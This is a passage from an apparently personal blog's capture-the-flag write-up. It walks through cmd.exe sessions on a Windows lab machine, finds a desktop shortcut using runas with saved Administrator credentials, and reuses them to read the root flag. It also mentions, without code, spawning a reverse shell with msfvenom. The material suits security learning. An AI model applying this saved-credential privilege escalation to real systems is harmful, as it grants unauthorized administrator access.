</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>               <span style=color:#099>6</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>754</span>,<span style=color:#099>778</span>,<span style=color:#099>112</span> bytes free
</span></span></code></pre></div><p>Maybe one of the other users has something interesting we can use?</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users&gt;<span style=color:#0086b3>cd </span>engineer
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>Access is denied.
</span></span></code></pre></div><p>I didn&rsquo;t really expect that to work anyway</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users&gt;<span style=color:#0086b3>cd </span>Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users\Public&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users\Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>05</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>06</span> AM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>               <span style=color:#099>1</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>179</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>               <span style=color:#099>7</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>723</span>,<span style=color:#099>468</span>,<span style=color:#099>288</span> bytes free
</span></span></code></pre></div><p>Wait a minute, we&rsquo;re missing some of the standard Windows directories. Let&rsquo;s have a closer look.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>C:\Users\Public&gt;<span style=color:#0086b3>dir </span>/A
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span> Directory of C:\Users\Public
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>02</span>/<span style=color:#099>02</span>/<span style=color:#099>2019</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>14</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#099>08</span>/<span style=color:#099>28</span>/<span style=color:#099>2018</span>  <span style=color:#099>06</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>51</span> AM    &lt;DIR&gt;          Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM               <span style=color:#099>174</span> desktop.ini
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>05</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>06</span> AM    &lt;DIR&gt;          Documents
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Downloads
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>02</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>34</span> AM    &lt;DIR&gt;          Favorites
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Libraries
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Music
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Pictures
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#099>07</span>/<span style=color:#099>14</span>/<span style=color:#099>2009</span>  <span style=color:#099>04</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>57</span> AM    &lt;DIR&gt;          Videos
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>               <span style=color:#099>2</span> File(s)        <span style=color:#099>964</span>,<span style=color:#099>353</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>              <span style=color:#099>10</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>717</span>,<span style=color:#099>438</span>,<span style=color:#099>976</span> bytes free
</span></span></code></pre></div><p>Desktop has a much more recent modification date than everything else</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>C:\Users\Public&gt;<span style=color:#0086b3>cd </span>Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>C:\Users\Public\Desktop&gt;<span style=color:#0086b3>dir
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#0086b3></span> Volume <span style=color:#000;font-weight:700>in</span> drive C has no label.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span> Volume Serial Number is 9C45-DBF0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span> Directory of C:\Users\Public\Desktop
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#099>08</span>/<span style=color:#099>22</span>/<span style=color:#099>2018</span>  <span style=color:#099>09</span><span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#099>18</span> PM             <span style=color:#099>1</span>,<span style=color:#099>870</span> ZKAccess3.5 Security System.lnk
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>               <span style=color:#099>1</span> File(s)          <span style=color:#099>1</span>,<span style=color:#099>870</span> bytes
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>               <span style=color:#099>0</span> Dir(s)  <span style=color:#099>16</span>,<span style=color:#099>711</span>,<span style=color:#099>475</span>,<span style=color:#099>200</span> bytes free
</span></span></code></pre></div><p>That&rsquo;s because there&rsquo;s a shortcut there.</p><p>Now, I&rsquo;m not sure of the best way to view a <code>.lnk</code> on <code>cmd.exe</code> via <code>telnet</code>, but this is what I came up with. If anyone knows of a better way, please let me know!</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;<span style=color:#0086b3>type </span><span style=color:#d14>&#34;ZKAccess3.5 Security System.lnk&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>L<span style=color:#a61717;background-color:#e3d2d2>�</span>F<span style=color:#a61717;background-color:#e3d2d2>�</span>@ <span style=color:#a61717;background-color:#e3d2d2>��</span><span style=color:#099>7</span><span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>7</span><span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#998;font-style:italic>#�P/P�O� �:i�+00�/C:\R1M�:Windows��:��M�:*wWindowsV1MV�System32��:��MV�*�System32X2P�:�</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>                                                                                                        runas.exe<span style=color:#a61717;background-color:#e3d2d2>��:</span><span style=color:#099>1</span><span style=color:#a61717;background-color:#e3d2d2>��:</span><span style=color:#099>1</span><span style=color:#a61717;background-color:#e3d2d2>�</span>*Yrunas.<span style=color:#0086b3>exeL-K</span><span style=color:#a61717;background-color:#e3d2d2>��</span>E<span style=color:#a61717;background-color:#e3d2d2>�</span>C:\Windows\System32\runas.exe<span style=color:#998;font-style:italic>#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred &#34;C:\ZKTeco\ZKAccess3.5\Access.exe&#34;&#39;C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>                      <span style=color:#a61717;background-color:#e3d2d2>�</span>wN<span style=color:#a61717;background-color:#e3d2d2>���</span>]N<span style=color:#a61717;background-color:#e3d2d2>�</span>D.<span style=color:#a61717;background-color:#e3d2d2>��</span>Q<span style=color:#a61717;background-color:#e3d2d2>���</span>`<span style=color:#a61717;background-color:#e3d2d2>�</span>Xaccess<span style=color:#a61717;background-color:#e3d2d2>�</span>_<span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>8</span>{E<span style=color:#a61717;background-color:#e3d2d2>�</span><span style=color:#099>3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>                                                          O<span style=color:#a61717;background-color:#e3d2d2>�</span>j)<span style=color:#a61717;background-color:#e3d2d2>�</span>H<span style=color:#a61717;background-color:#e3d2d2>���</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>                                                                   )ΰ[<span style=color:#a61717;background-color:#e3d2d2>�</span>_<span style=color:#a61717;background-color:#e3d2d2>���</span><span style=color:#099>8</span>{E<span style=color:#a61717;background-color:#e3d2d2>�</span><span style=color:#099>3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>                                                                                O<span style=color:#a61717;background-color:#e3d2d2>�</span>j)<span style=color:#a61717;background-color:#e3d2d2>�</span>H<span style=color:#a61717;background-color:#e3d2d2>���</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>                                                                                         )ΰ[<span style=color:#a61717;background-color:#e3d2d2>�</span>	<span style=color:#a61717;background-color:#e3d2d2>��</span>1SPS<span style=color:#a61717;background-color:#e3d2d2>�</span>XF<span style=color:#a61717;background-color:#e3d2d2>�</span>L8C<span style=color:#a61717;background-color:#e3d2d2>���</span>&amp;<span style=color:#a61717;background-color:#e3d2d2>�</span>m<span style=color:#a61717;background-color:#e3d2d2>�</span>e*S-<span style=color:#099>1</span>-<span style=color:#099>5</span>-<span style=color:#099>21</span>-<span style=color:#099>953262931</span>-<span style=color:#099>566350628</span>-<span style=color:#099>63446256</span>-<span style=color:#099>500</span>
</span></span></code></pre></div><p>It&rsquo;s a bit difficult to read, but it looks like the shortcut runs a program as the <code>Administrator</code> using saved credentials. We can use that.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;runas /user<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /savecred <span style=color:#d14>&#34;cmd.exe /c more C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\Public\Desktop\output.txt&#34;</span>
</span></span></code></pre></div><p>Did it work?</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-posh data-lang=posh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>C:\Users\Public\Desktop&gt;more output.txt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Yes! From there we could generate a reverse shell using <code>msfvenom</code> and run that as <code>Administrator</code>, but I&rsquo;ve got the flag so I&rsquo;ll leave it there for now.</p></div><div id=disqus_thread></div></div><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var e=document.createElement("script");e.async=!0,e.type="text/javascript",e.src="//"+disqus_shortname+".disqus.com/count.js",(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(e)})()</script><script type=text/javascript>var disqus_shortname="jamiemagee";(function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=http://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></body></html>